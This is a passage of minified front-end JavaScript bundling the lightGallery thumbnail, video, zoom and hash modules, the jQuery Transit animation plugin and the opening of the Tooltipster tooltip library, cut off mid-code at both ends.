            i && t.getJSON("http://www.vimeo.com/api/v2/video/" + i + ".json?callback=?", {format: "json"}, (function (t) {
                e.find("img").attr("src", t[0][o.core.s.vimeoThumbSize])
            }))
        })), n.eq(o.core.index).addClass("active"), o.core.$el.on("onBeforeSlide.lg.tm", (function () {
            n.removeClass("active"), n.eq(o.core.index).addClass("active")
        })), n.on("click.lg touchend.lg", (function () {
            var e = t(this);
            setTimeout((function () {
                (o.thumbClickable && !o.core.lgBusy || !o.core.doCss()) && (o.core.index = e.index(), o.core.slide(o.core.index, !1, !0))
            }), 50)
        })), o.core.$el.on("onBeforeSlide.lg.tm", (function () {
            o.animateThumb(o.core.index)
        })), t(e).on("resize.lg.thumb orientationchange.lg.thumb", (function () {
            setTimeout((function () {
                o.animateThumb(o.core.index), o.thumbOuterWidth = o.$thumbOuter.width()
            }), 200)
        }))
    }, s.prototype.setTranslate = function (t) {
        this.core.$outer.find(".lg-thumb").css({transform: "translate3d(-" + t + "px, 0px, 0px)"})
    }, s.prototype.animateThumb = function (t) {
        var e = this.core.$outer.find(".lg-thumb");
        if (this.core.s.animateThumb) {
            var i;
            switch (this.core.s.currentPagerPosition) {
                case"left":
                    i = 0;
                    break;
                case"middle":
                    i = this.thumbOuterWidth / 2 - this.core.s.thumbWidth / 2;
                    break;
                case"right":
                    i = this.thumbOuterWidth - this.core.s.thumbWidth
            }
            this.left = (this.core.s.thumbWidth + this.core.s.thumbMargin) * t - 1 - i, this.left > this.thumbTotalWidth - this.thumbOuterWidth && (this.left = this.thumbTotalWidth - this.thumbOuterWidth), this.left < 0 && (this.left = 0), this.core.lGalleryOn ? (e.hasClass("on") || this.core.$outer.find(".lg-thumb").css("transition-duration", this.core.s.speed + "ms"), this.core.doCss() || e.animate({left: -this.left + "px"}, this.core.s.speed)) : this.core.doCss() || e.css("left", -this.left + "px"), this.setTranslate(this.left)
        }
    }, s.prototype.enableThumbDrag = function () {
        var i = this, n = 0, o = 0, s = !1, r = !1, a = 0;
        i.$thumbOuter.addClass("lg-grab"), i.core.$outer.find(".lg-thumb").on("mousedown.lg.thumb", (function (t) {
            i.thumbTotalWidth > i.thumbOuterWidth && (t.preventDefault(), n = t.pageX, s = !0, i.core.$outer.scrollLeft += 1, i.core.$outer.scrollLeft -= 1, i.thumbClickable = !1, i.$thumbOuter.removeClass("lg-grab").addClass("lg-grabbing"))
        })), t(e).on("mousemove.lg.thumb", (function (t) {
            s && (a = i.left, r = !0, o = t.pageX, i.$thumbOuter.addClass("lg-dragging"), (a -= o - n) > i.thumbTotalWidth - i.thumbOuterWidth && (a = i.thumbTotalWidth - i.thumbOuterWidth), 0 > a && (a = 0), i.setTranslate(a))
        })), t(e).on("mouseup.lg.thumb", (function () {
            r ? (r = !1, i.$thumbOuter.removeClass("lg-dragging"), i.left = a, Math.abs(o - n) < i.core.s.swipeThreshold && (i.thumbClickable = !0)) : i.thumbClickable = !0, s && (s = !1, i.$thumbOuter.removeClass("lg-grabbing").addClass("lg-grab"))
        }))
    }, s.prototype.enableThumbSwipe = function () {
        var t = this, e = 0, i = 0, n = !1, o = 0;
        t.core.$outer.find(".lg-thumb").on("touchstart.lg", (function (i) {
            t.thumbTotalWidth > t.thumbOuterWidth && (i.preventDefault(), e = i.originalEvent.targetTouches[0].pageX, t.thumbClickable = !1)
        })), t.core.$outer.find(".lg-thumb").on("touchmove.lg", (function (s) {
            t.thumbTotalWidth > t.thumbOuterWidth && (s.preventDefault(), i = s.originalEvent.targetTouches[0].pageX, n = !0, t.$thumbOuter.addClass("lg-dragging"), o = t.left, (o -= i - e) > t.thumbTotalWidth - t.thumbOuterWidth && (o = t.thumbTotalWidth - t.thumbOuterWidth), 0 > o && (o = 0), t.setTranslate(o))
        })), t.core.$outer.find(".lg-thumb").on("touchend.lg", (function () {
            t.thumbTotalWidth > t.thumbOuterWidth && n ? (n = !1, t.$thumbOuter.removeClass("lg-dragging"), Math.abs(i - e) < t.core.s.swipeThreshold && (t.thumbClickable = !0), t.left = o) : t.thumbClickable = !0
        }))
    }, s.prototype.toogle = function () {
        var t = this;
        t.core.s.toogleThumb && (t.core.$outer.addClass("lg-can-toggle"), t.$thumbOuter.append('<span class="lg-toogle-thumb lg-icon"></span>'), t.core.$outer.find(".lg-toogle-thumb").on("click.lg", (function () {
            t.core.$outer.toggleClass("lg-thumb-open")
        })))
    }, s.prototype.thumbkeyPress = function () {
        var i = this;
        t(e).on("keydown.lg.thumb", (function (t) {
            38 === t.keyCode ? (t.preventDefault(), i.core.$outer.addClass("lg-thumb-open")) : 40 === t.keyCode && (t.preventDefault(), i.core.$outer.removeClass("lg-thumb-open"))
        }))
    }, s.prototype.destroy = function () {
        this.core.s.thumbnail && this.core.$items.length > 1 && (t(e).off("resize.lg.thumb orientationchange.lg.thumb keydown.lg.thumb"), this.$thumbOuter.remove(), this.core.$outer.removeClass("lg-has-thumb"))
    }, t.fn.lightGallery.modules.Thumbnail = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {
        videoMaxWidth: "855px",
        youtubePlayerParams: !1,
        vimeoPlayerParams: !1,
        dailymotionPlayerParams: !1,
        videojs: !1
    }, s = function (e) {
        return this.core = t(e).data("lightGallery"), this.$el = t(e), this.core.s = t.extend({}, o, this.core.s), this.videoLoaded = !1, this.init(), this
    };
    s.prototype.init = function () {
        var e = this;
        e.core.$el.on("hasVideo.lg.tm", (function (t, i, n, o) {
            if (e.core.$slide.eq(i).find(".lg-video").append(e.loadVideo(n, "lg-object", !0, i, o)), o) if (e.core.s.videojs) try {
                videojs(e.core.$slide.eq(i).find(".lg-html5").get(0), {}, (function () {
                    e.videoLoaded || this.play()
                }))
            } catch (t) {
                console.error("Make sure you have included videojs")
            } else e.core.$slide.eq(i).find(".lg-html5").get(0).play()
        })), e.core.$el.on("onAferAppendSlide.lg.tm", (function (t, i) {
            e.core.$slide.eq(i).find(".lg-video-cont").css("max-width", e.core.s.videoMaxWidth), e.videoLoaded = !0
        }));
        var i = function (t) {
            if (t.find(".lg-object").hasClass("lg-has-poster")) if (t.hasClass("lg-has-video")) {
                var i = t.find(".lg-youtube").get(0), n = t.find(".lg-vimeo").get(0),
                    o = t.find(".lg-dailymotion").get(0), s = t.find(".lg-html5").get(0);
                if (i) i.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', "*"); else if (n) try {
                    $f(n).api("play")
                } catch (t) {
                    console.error("Make sure you have included froogaloop2 js")
                } else if (o) o.contentWindow.postMessage("play", "*"); else if (s) if (e.core.s.videojs) try {
                    videojs(s).play()
                } catch (t) {
                    console.error("Make sure you have included videojs")
                } else s.play();
                t.addClass("lg-video-palying")
            } else {
                t.addClass("lg-video-palying lg-has-video");
                var r = function (i, n) {
                    if (t.find(".lg-video").append(e.loadVideo(i, "", !1, e.core.index, n)), n) if (e.core.s.videojs) try {
                        videojs(e.core.$slide.eq(e.core.index).find(".lg-html5").get(0), {}, (function () {
                            this.play()
                        }))
                    } catch (t) {
                        console.error("Make sure you have included videojs")
                    } else e.core.$slide.eq(e.core.index).find(".lg-html5").get(0).play()
                };
                e.core.s.dynamic ? r(e.core.s.dynamicEl[e.core.index].src, e.core.s.dynamicEl[e.core.index].html) : r(e.core.$items.eq(e.core.index).attr("href") || e.core.$items.eq(e.core.index).attr("data-src"), e.core.$items.eq(e.core.index).attr("data-html"));
                var a = t.find(".lg-object");
                t.find(".lg-video").append(a), t.find(".lg-video-object").hasClass("lg-html5") || (t.removeClass("lg-complete"), t.find(".lg-video-object").on("load.lg error.lg", (function () {
                    t.addClass("lg-complete")
                })))
            }
        };
        e.core.doCss() && e.core.$items.length > 1 && (e.core.s.enableSwipe && e.core.isTouch || e.core.s.enableDrag && !e.core.isTouch) ? e.core.$el.on("onSlideClick.lg.tm", (function () {
            var t = e.core.$slide.eq(e.core.index);
            i(t)
        })) : e.core.$slide.on("click.lg", (function () {
            i(t(this))
        })), e.core.$el.on("onBeforeSlide.lg.tm", (function (t, i) {
            var n = e.core.$slide.eq(i), o = n.find(".lg-youtube").get(0), s = n.find(".lg-vimeo").get(0),
                r = n.find(".lg-dailymotion").get(0), a = n.find(".lg-html5").get(0);
            if (o) o.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', "*"); else if (s) try {
                $f(s).api("pause")
            } catch (t) {
                console.error("Make sure you have included froogaloop2 js")
            } else if (r) r.contentWindow.postMessage("pause", "*"); else if (a) if (e.core.s.videojs) try {
                videojs(a).pause()
            } catch (t) {
                console.error("Make sure you have included videojs")
            } else a.pause()
        })), e.core.$el.on("onAfterSlide.lg.tm", (function (t, i) {
            e.core.$slide.eq(i).removeClass("lg-video-palying")
        }))
    }, s.prototype.loadVideo = function (e, i, n, o, s) {
        var r = "", a = 1, l = "", c = this.core.isVideo(e, o) || {};
        if (n && (a = this.videoLoaded ? 0 : 1), c.youtube) l = "?wmode=opaque&autoplay=" + a + "&enablejsapi=1", this.core.s.youtubePlayerParams && (l = l + "&" + t.param(this.core.s.youtubePlayerParams)), r = '<iframe class="lg-video-object lg-youtube ' + i + '" width="560" height="315" src="//www.youtube.com/embed/' + c.youtube[1] + l + '" frameborder="0" allowfullscreen></iframe>'; else if (c.vimeo) l = "?autoplay=" + a + "&api=1", this.core.s.vimeoPlayerParams && (l = l + "&" + t.param(this.core.s.vimeoPlayerParams)), r = '<iframe class="lg-video-object lg-vimeo ' + i + '" width="560" height="315"  src="http://player.vimeo.com/video/' + c.vimeo[1] + l + '" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>'; else if (c.dailymotion) l = "?wmode=opaque&autoplay=" + a + "&api=postMessage", this.core.s.dailymotionPlayerParams && (l = l + "&" + t.param(this.core.s.dailymotionPlayerParams)), r = '<iframe class="lg-video-object lg-dailymotion ' + i + '" width="560" height="315" src="//www.dailymotion.com/embed/video/' + c.dailymotion[1] + l + '" frameborder="0" allowfullscreen></iframe>'; else if (c.html5) {
            var d = s.substring(0, 1);
            ("." === d || "#" === d) && (s = t(s).html()), r = s
        }
        return r
    }, s.prototype.destroy = function () {
        this.videoLoaded = !1
    }, t.fn.lightGallery.modules.video = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {scale: 1, zoom: !0, enableZoomAfter: 300}, s = function (i) {
        return this.core = t(i).data("lightGallery"), this.core.s = t.extend({}, o, this.core.s), this.core.s.zoom && this.core.doCss() && (this.init(), this.zoomabletimeout = !1, this.pageX = t(e).width() / 2, this.pageY = t(e).height() / 2 + t(e).scrollTop()), this
    };
    s.prototype.init = function () {
        var i = this;
        this.core.$outer.find(".lg-toolbar").append('<span id="lg-zoom-in" class="lg-icon"></span><span id="lg-zoom-out" class="lg-icon"></span>'), i.core.$el.on("onSlideItemLoad.lg.tm.zoom", (function (e, n, o) {
            var s = i.core.s.enableZoomAfter + o;
            t("body").hasClass("lg-from-hash") && o ? s = 0 : t("body").removeClass("lg-from-hash"), i.zoomabletimeout = setTimeout((function () {
                i.core.$slide.eq(n).addClass("lg-zoomable")
            }), s + 30)
        }));
        var n = 1, o = function (n) {
            var o = i.core.$outer.find(".lg-current .lg-image"), s = (t(e).width() - o.width()) / 2,
                r = (t(e).height() - o.height()) / 2 + t(e).scrollTop(), a = (n - 1) * (i.pageX - s),
                l = (n - 1) * (i.pageY - r);
            o.css("transform", "scale3d(" + n + ", " + n + ", 1)").attr("data-scale", n), o.parent().css("transform", "translate3d(-" + a + "px, -" + l + "px, 0)").attr("data-x", a).attr("data-y", l)
        }, s = function () {
            n > 1 ? i.core.$outer.addClass("lg-zoomed") : i.resetZoom(), 1 > n && (n = 1), o(n)
        };
        i.core.$el.on("onAferAppendSlide.lg.tm.zoom", (function (t, e) {
            var o = i.core.$slide.eq(e).find(".lg-image");
            o.dblclick((function (t) {
                var r = o.width(), a = i.core.$items.eq(e).attr("data-width") || o[0].naturalWidth || r;
                i.core.$outer.hasClass("lg-zoomed") ? n = 1 : a > r && (n = a / r || 2), i.pageX = t.pageX, i.pageY = t.pageY, s(), setTimeout((function () {
                    i.core.$outer.removeClass("lg-grabbing").addClass("lg-grab")
                }), 10)
            }))
        })), t(e).on("resize.lg.zoom scroll.lg.zoom orientationchange.lg.zoom", (function () {
            i.pageX = t(e).width() / 2, i.pageY = t(e).height() / 2 + t(e).scrollTop(), o(n)
        })), t("#lg-zoom-out").on("click.lg", (function () {
            i.core.$outer.find(".lg-current .lg-image").length && (n -= i.core.s.scale, s())
        })), t("#lg-zoom-in").on("click.lg", (function () {
            i.core.$outer.find(".lg-current .lg-image").length && (n += i.core.s.scale, s())
        })), i.core.$el.on("onBeforeSlide.lg.tm", (function () {
            i.resetZoom()
        })), i.core.isTouch || i.zoomDrag(), i.core.isTouch && i.zoomSwipe()
    }, s.prototype.resetZoom = function () {
        this.core.$outer.removeClass("lg-zoomed"), this.core.$slide.find(".lg-img-wrap").removeAttr("style data-x data-y"), this.core.$slide.find(".lg-image").removeAttr("style data-scale"), this.pageX = t(e).width() / 2, this.pageY = t(e).height() / 2 + t(e).scrollTop()
    }, s.prototype.zoomSwipe = function () {
        var t = this, e = {}, i = {}, n = !1, o = !1, s = !1;
        t.core.$slide.on("touchstart.lg", (function (i) {
            if (t.core.$outer.hasClass("lg-zoomed")) {
                var n = t.core.$slide.eq(t.core.index).find(".lg-object");
                s = n.outerHeight() * n.attr("data-scale") > t.core.$outer.find(".lg").height(), ((o = n.outerWidth() * n.attr("data-scale") > t.core.$outer.find(".lg").width()) || s) && (i.preventDefault(), e = {
                    x: i.originalEvent.targetTouches[0].pageX,
                    y: i.originalEvent.targetTouches[0].pageY
                })
            }
        })), t.core.$slide.on("touchmove.lg", (function (r) {
            if (t.core.$outer.hasClass("lg-zoomed")) {
                var a, l, c = t.core.$slide.eq(t.core.index).find(".lg-img-wrap");
                r.preventDefault(), n = !0, i = r.originalEvent.targetTouches[0].pageX, i = {
                    x: r.originalEvent.targetTouches[0].pageX,
                    y: r.originalEvent.targetTouches[0].pageY
                }, t.core.$outer.addClass("lg-zoom-dragging"), l = s ? -Math.abs(c.attr("data-y")) + (i.y - e.y) : -Math.abs(c.attr("data-y")), a = o ? -Math.abs(c.attr("data-x")) + (i.x - e.x) : -Math.abs(c.attr("data-x")), c.css("transform", "translate3d(" + a + "px, " + l + "px, 0)")
            }
        })), t.core.$slide.on("touchend.lg", (function () {
            t.core.$outer.hasClass("lg-zoomed") && n && (n = !1, t.core.$outer.removeClass("lg-zoom-dragging"), t.touchendZoom(e, i, o, s))
        }))
    }, s.prototype.zoomDrag = function () {
        var i = this, n = {}, o = {}, s = !1, r = !1, a = !1, l = !1;
        i.core.$slide.on("mousedown.lg.zoom", (function (e) {
            var o = i.core.$slide.eq(i.core.index).find(".lg-object");
            l = o.outerHeight() * o.attr("data-scale") > i.core.$outer.find(".lg").height(), a = o.outerWidth() * o.attr("data-scale") > i.core.$outer.find(".lg").width(), i.core.$outer.hasClass("lg-zoomed") && t(e.target).hasClass("lg-object") && (a || l) && (e.preventDefault(), n = {
                x: e.pageX,
                y: e.pageY
            }, s = !0, i.core.$outer.scrollLeft += 1, i.core.$outer.scrollLeft -= 1, i.core.$outer.removeClass("lg-grab").addClass("lg-grabbing"))
        })), t(e).on("mousemove.lg.zoom", (function (t) {
            if (s) {
                var e, c, d = i.core.$slide.eq(i.core.index).find(".lg-img-wrap");
                r = !0, o = {
                    x: t.pageX,
                    y: t.pageY
                }, i.core.$outer.addClass("lg-zoom-dragging"), c = l ? -Math.abs(d.attr("data-y")) + (o.y - n.y) : -Math.abs(d.attr("data-y")), e = a ? -Math.abs(d.attr("data-x")) + (o.x - n.x) : -Math.abs(d.attr("data-x")), d.css("transform", "translate3d(" + e + "px, " + c + "px, 0)")
            }
        })), t(e).on("mouseup.lg.zoom", (function (t) {
            s && (s = !1, i.core.$outer.removeClass("lg-zoom-dragging"), !r || n.x === o.x && n.y === o.y || (o = {
                x: t.pageX,
                y: t.pageY
            }, i.touchendZoom(n, o, a, l)), r = !1), i.core.$outer.removeClass("lg-grabbing").addClass("lg-grab")
        }))
    }, s.prototype.touchendZoom = function (t, e, i, n) {
        var o = this, s = o.core.$slide.eq(o.core.index).find(".lg-img-wrap"),
            r = o.core.$slide.eq(o.core.index).find(".lg-object"), a = -Math.abs(s.attr("data-x")) + (e.x - t.x),
            l = -Math.abs(s.attr("data-y")) + (e.y - t.y),
            c = (o.core.$outer.find(".lg").height() - r.outerHeight()) / 2,
            d = Math.abs(r.outerHeight() * Math.abs(r.attr("data-scale")) - o.core.$outer.find(".lg").height() + c),
            u = (o.core.$outer.find(".lg").width() - r.outerWidth()) / 2,
            h = Math.abs(r.outerWidth() * Math.abs(r.attr("data-scale")) - o.core.$outer.find(".lg").width() + u);
        n && (-d >= l ? l = -d : l >= -c && (l = -c)), i && (-h >= a ? a = -h : a >= -u && (a = -u)), n ? s.attr("data-y", Math.abs(l)) : l = -Math.abs(s.attr("data-y")), i ? s.attr("data-x", Math.abs(a)) : a = -Math.abs(s.attr("data-x")), s.css("transform", "translate3d(" + a + "px, " + l + "px, 0)")
    }, s.prototype.destroy = function () {
        var i = this;
        i.core.$el.off(".lg.zoom"), t(e).off(".lg.zoom"), i.core.$slide.off(".lg.zoom"), i.core.$el.off(".lg.tm.zoom"), i.resetZoom(), clearTimeout(i.zoomabletimeout), i.zoomabletimeout = !1
    }, t.fn.lightGallery.modules.zoom = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {hash: !0}, s = function (i) {
        return this.core = t(i).data("lightGallery"), this.core.s = t.extend({}, o, this.core.s), this.core.s.hash && (this.oldHash = e.location.hash, this.init()), this
    };
    s.prototype.init = function () {
        var i, n = this;
        n.core.$el.on("onAfterSlide.lg.tm", (function (t, i, o) {
            e.location.hash = "lg=" + n.core.s.galleryId + "&slide=" + o
        })), t(e).on("hashchange", (function () {
            i = e.location.hash;
            var t = parseInt(i.split("&slide=")[1], 10);
            i.indexOf("lg=" + n.core.s.galleryId) > -1 ? n.core.slide(t) : n.core.lGalleryOn && n.core.destroy()
        }))
    }, s.prototype.destroy = function () {
        this.oldHash && this.oldHash.indexOf("lg=" + this.core.s.galleryId) < 0 ? e.location.hash = this.oldHash : history.pushState ? history.pushState("", i.title, e.location.pathname + e.location.search) : e.location.hash = ""
    }, t.fn.lightGallery.modules.hash = s
}(jQuery, window, document), function (t, e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? module.exports = e(require("jquery")) : e(t.jQuery)
}(this, (function (t) {
    t.transit = {
        version: "0.9.12",
        propertyMap: {
            marginLeft: "margin",
            marginRight: "margin",
            marginBottom: "margin",
            marginTop: "margin",
            paddingLeft: "padding",
            paddingRight: "padding",
            paddingBottom: "padding",
            paddingTop: "padding"
        },
        enabled: !0,
        useTransitionEnd: !1
    };
    var e = document.createElement("div"), i = {};

    function n(t) {
        if (t in e.style) return t;
        for (var i = ["Moz", "Webkit", "O", "ms"], n = t.charAt(0).toUpperCase() + t.substr(1), o = 0; o < i.length; ++o) {
            var s = i[o] + n;
            if (s in e.style) return s
        }
    }

    var o = navigator.userAgent.toLowerCase().indexOf("chrome") > -1;
    i.transition = n("transition"), i.transitionDelay = n("transitionDelay"), i.transform = n("transform"), i.transformOrigin = n("transformOrigin"), i.filter = n("Filter"), i.transform3d = (e.style[i.transform] = "", e.style[i.transform] = "rotateY(90deg)", "" !== e.style[i.transform]);
    var s = i.transitionEnd = {
        transition: "transitionend",
        MozTransition: "transitionend",
        OTransition: "oTransitionEnd",
        WebkitTransition: "webkitTransitionEnd",
        msTransition: "MSTransitionEnd"
    }[i.transition] || null;
    for (var r in i) i.hasOwnProperty(r) && void 0 === t.support[r] && (t.support[r] = i[r]);

    function a(t) {
        return "string" == typeof t && this.parse(t), this
    }

    function l(t, e, i) {
        !0 === e ? t.queue(i) : e ? t.queue(e, i) : t.each((function () {
            i.call(this)
        }))
    }

    function c(e) {
        var n = [];
        return t.each(e, (function (e) {
            e = t.camelCase(e), e = h(e = t.transit.propertyMap[e] || t.cssProps[e] || e), i[e] && (e = h(i[e])), -1 === t.inArray(e, n) && n.push(e)
        })), n
    }

    function d(e, i, n, o) {
        var s = c(e);
        t.cssEase[n] && (n = t.cssEase[n]);
        var r = f(i) + " " + n;
        parseInt(o, 10) > 0 && (r += " " + f(o));
        var a = [];
        return t.each(s, (function (t, e) {
            a.push(e + " " + r)
        })), a.join(", ")
    }

    function u(e, n) {
        n || (t.cssNumber[e] = !0), t.transit.propertyMap[e] = i.transform, t.cssHooks[e] = {
            get: function (i) {
                return t(i).css("transit:transform").get(e)
            }, set: function (i, n) {
                var o = t(i).css("transit:transform");
                o.setFromString(e, n), t(i).css({"transit:transform": o})
            }
        }
    }

    function h(t) {
        return t.replace(/([A-Z])/g, (function (t) {
            return "-" + t.toLowerCase()
        }))
    }

    function p(t, e) {
        return "string" != typeof t || t.match(/^[\-0-9\.]+$/) ? "" + t + e : t
    }

    function f(e) {
        var i = e;
        return "string" != typeof i || i.match(/^[\-0-9\.]+/) || (i = t.fx.speeds[i] || t.fx.speeds._default), p(i, "ms")
    }

    return e = null, t.cssEase = {
        _default: "ease",
        in: "ease-in",
        out: "ease-out",
        "in-out": "ease-in-out",
        snap: "cubic-bezier(0,1,.5,1)",
        easeInCubic: "cubic-bezier(.550,.055,.675,.190)",
        easeOutCubic: "cubic-bezier(.215,.61,.355,1)",
        easeInOutCubic: "cubic-bezier(.645,.045,.355,1)",
        easeInCirc: "cubic-bezier(.6,.04,.98,.335)",
        easeOutCirc: "cubic-bezier(.075,.82,.165,1)",
        easeInOutCirc: "cubic-bezier(.785,.135,.15,.86)",
        easeInExpo: "cubic-bezier(.95,.05,.795,.035)",
        easeOutExpo: "cubic-bezier(.19,1,.22,1)",
        easeInOutExpo: "cubic-bezier(1,0,0,1)",
        easeInQuad: "cubic-bezier(.55,.085,.68,.53)",
        easeOutQuad: "cubic-bezier(.25,.46,.45,.94)",
        easeInOutQuad: "cubic-bezier(.455,.03,.515,.955)",
        easeInQuart: "cubic-bezier(.895,.03,.685,.22)",
        easeOutQuart: "cubic-bezier(.165,.84,.44,1)",
        easeInOutQuart: "cubic-bezier(.77,0,.175,1)",
        easeInQuint: "cubic-bezier(.755,.05,.855,.06)",
        easeOutQuint: "cubic-bezier(.23,1,.32,1)",
        easeInOutQuint: "cubic-bezier(.86,0,.07,1)",
        easeInSine: "cubic-bezier(.47,0,.745,.715)",
        easeOutSine: "cubic-bezier(.39,.575,.565,1)",
        easeInOutSine: "cubic-bezier(.445,.05,.55,.95)",
        easeInBack: "cubic-bezier(.6,-.28,.735,.045)",
        easeOutBack: "cubic-bezier(.175, .885,.32,1.275)",
        easeInOutBack: "cubic-bezier(.68,-.55,.265,1.55)"
    }, t.cssHooks["transit:transform"] = {
        get: function (e) {
            return t(e).data("transform") || new a
        }, set: function (e, n) {
            var s = n;
            s instanceof a || (s = new a(s)), "WebkitTransform" !== i.transform || o ? e.style[i.transform] = s.toString() : e.style[i.transform] = s.toString(!0), t(e).data("transform", s)
        }
    }, t.cssHooks.transform = {set: t.cssHooks["transit:transform"].set}, t.cssHooks.filter = {
        get: function (t) {
            return t.style[i.filter]
        }, set: function (t, e) {
            t.style[i.filter] = e
        }
    }, t.fn.jquery < "1.8" && (t.cssHooks.transformOrigin = {
        get: function (t) {
            return t.style[i.transformOrigin]
        }, set: function (t, e) {
            t.style[i.transformOrigin] = e
        }
    }, t.cssHooks.transition = {
        get: function (t) {
            return t.style[i.transition]
        }, set: function (t, e) {
            t.style[i.transition] = e
        }
    }), u("scale"), u("scaleX"), u("scaleY"), u("translate"), u("rotate"), u("rotateX"), u("rotateY"), u("rotate3d"), u("perspective"), u("skewX"), u("skewY"), u("x", !0), u("y", !0), a.prototype = {
        setFromString: function (t, e) {
            var i = "string" == typeof e ? e.split(",") : e.constructor === Array ? e : [e];
            i.unshift(t), a.prototype.set.apply(this, i)
        }, set: function (t) {
            var e = Array.prototype.slice.apply(arguments, [1]);
            this.setter[t] ? this.setter[t].apply(this, e) : this[t] = e.join(",")
        }, get: function (t) {
            return this.getter[t] ? this.getter[t].apply(this) : this[t] || 0
        }, setter: {
            rotate: function (t) {
                this.rotate = p(t, "deg")
            }, rotateX: function (t) {
                this.rotateX = p(t, "deg")
            }, rotateY: function (t) {
                this.rotateY = p(t, "deg")
            }, scale: function (t, e) {
                void 0 === e && (e = t), this.scale = t + "," + e
            }, skewX: function (t) {
                this.skewX = p(t, "deg")
            }, skewY: function (t) {
                this.skewY = p(t, "deg")
            }, perspective: function (t) {
                this.perspective = p(t, "px")
            }, x: function (t) {
                this.set("translate", t, null)
            }, y: function (t) {
                this.set("translate", null, t)
            }, translate: function (t, e) {
                void 0 === this._translateX && (this._translateX = 0), void 0 === this._translateY && (this._translateY = 0), null != t && (this._translateX = p(t, "px")), null != e && (this._translateY = p(e, "px")), this.translate = this._translateX + "," + this._translateY
            }
        }, getter: {
            x: function () {
                return this._translateX || 0
            }, y: function () {
                return this._translateY || 0
            }, scale: function () {
                var t = (this.scale || "1,1").split(",");
                return t[0] && (t[0] = parseFloat(t[0])), t[1] && (t[1] = parseFloat(t[1])), t[0] === t[1] ? t[0] : t
            }, rotate3d: function () {
                for (var t = (this.rotate3d || "0,0,0,0deg").split(","), e = 0; e <= 3; ++e) t[e] && (t[e] = parseFloat(t[e]));
                return t[3] && (t[3] = p(t[3], "deg")), t
            }
        }, parse: function (t) {
            var e = this;
            t.replace(/([a-zA-Z0-9]+)\((.*?)\)/g, (function (t, i, n) {
                e.setFromString(i, n)
            }))
        }, toString: function (t) {
            var e = [];
            for (var n in this) if (this.hasOwnProperty(n)) {
                if (!i.transform3d && ("rotateX" === n || "rotateY" === n || "perspective" === n || "transformOrigin" === n)) continue;
                "_" !== n[0] && (t && "scale" === n ? e.push(n + "3d(" + this[n] + ",1)") : t && "translate" === n ? e.push(n + "3d(" + this[n] + ",0)") : e.push(n + "(" + this[n] + ")"))
            }
            return e.join(" ")
        }
    }, t.fn.transition = t.fn.transit = function (e, n, o, r) {
        var a = this, c = 0, u = !0, h = t.extend(!0, {}, e);
        "function" == typeof n && (r = n, n = void 0), "object" == typeof n && (o = n.easing, c = n.delay || 0, u = void 0 === n.queue || n.queue, r = n.complete, n = n.duration), "function" == typeof o && (r = o, o = void 0), void 0 !== h.easing && (o = h.easing, delete h.easing), void 0 !== h.duration && (n = h.duration, delete h.duration), void 0 !== h.complete && (r = h.complete, delete h.complete), void 0 !== h.queue && (u = h.queue, delete h.queue), void 0 !== h.delay && (c = h.delay, delete h.delay), void 0 === n && (n = t.fx.speeds._default), void 0 === o && (o = t.cssEase._default), n = f(n);
        var p = d(h, n, o, c), g = t.transit.enabled && i.transition ? parseInt(n, 10) + parseInt(c, 10) : 0;
        if (0 === g) {
            return l(a, u, (function (t) {
                a.css(h), r && r.apply(a), t && t()
            })), a
        }
        var m = {}, v = function (e) {
            var n = !1, o = function () {
                n && a.unbind(s, o), g > 0 && a.each((function () {
                    this.style[i.transition] = m[this] || null
                })), "function" == typeof r && r.apply(a), "function" == typeof e && e()
            };
            g > 0 && s && t.transit.useTransitionEnd ? (n = !0, a.bind(s, o)) : window.setTimeout(o, g), a.each((function () {
                g > 0 && (this.style[i.transition] = p), t(this).css(h)
            }))
        };
        return l(a, u, (function (t) {
            this.offsetWidth, v(t)
        })), this
    }, t.transit.getTransitionValue = d, t
})), function (t, e) {
    "function" == typeof define && define.amd ? define(["jquery"], (function (t) {
        return e(t)
    })) : "object" == typeof exports ? module.exports = e(require("jquery")) : e(jQuery)
}(0, (function (t) {
    function e(t) {
        this.$container, this.constraints = null, this.__$tooltip, this.__init(t)
    }

    function i(e, i) {
        var n = !0;
        return t.each(e, (function (t, o) {
            return void 0 === i[t] || e[t] !== i[t] ? (n = !1, !1) : void 0
        })), n
    }

    function n(e) {
        var i = e.attr("id"), n = i ? r.window.document.getElementById(i) : null;
        return n ? n === e[0] : t.contains(r.window.document.body, e[0])
    }

    var o = {
        animation: "fade",
        animationDuration: 350,
        content: null,
        contentAsHTML: !1,
        contentCloning: !1,
        debug: !0,
        delay: 300,
        delayTouch: [300, 500],
        functionInit: null,
        functionBefore: null,
        functionReady: null,
        functionAfter: null,
        functionFormat: null,
        IEmin: 6,
        interactive: !1,
        multiple: !1,
        parent: null,
        plugins: ["sideTip"],
        repositionOnScroll: !1,
        restoration: "none",
        selfDestruction: !0,
        theme: [],
        timer: 0,
        trackerInterval: 500,
        trackOrigin: !1,
        trackTooltip: !1,
        trigger: "hover",
        triggerClose: {click: !1, mouseleave: !1, originClick: !1, scroll: !1, tap: !1, touchleave: !1},
        triggerOpen: {click: !1, mouseenter: !1, tap: !1, touchstart: !1},
        updateAnimation: "rotate",
        zIndex: 9999999
    }, s = "undefined" != typeof window ? window : null, r = {
        hasTouchCapability: !(!s || !("ontouchstart" in s || s.DocumentTouch && s.document instanceof s.DocumentTouch || s.navigator.maxTouchPoints)),
        hasTransitions: function () {
            if (!s) return !1;
            var t = (s.document.body || s.document.documentElement).style, e = "transition",
                i = ["Moz", "Webkit", "Khtml", "O", "ms"];
            if ("string" == typeof t[e]) return !0;
            e = e.charAt(0).toUpperCase() + e.substr(1);
            for (var n = 0; n < i.length; n++) if ("string" == typeof t[i[n] + e]) return !0;
            return !1
        }(),
        IE: !1,
        semVer: "4.2.3",
        window: s
    }, a = function () {
        this.__$emitterPrivate = t({}), this.__$emitterPublic = t({}), this.__instancesLatestArr = [], this.__plugins = {}, this._env = r
    };
    a.prototype = {
        __bridge: function (e, i, n) {
            if (!i[n]) {
                var s = function () {
                };
                s.prototype = e;
                var r = new s;
                r.__init && r.__init(i), t.each(e, (function (t, e) {
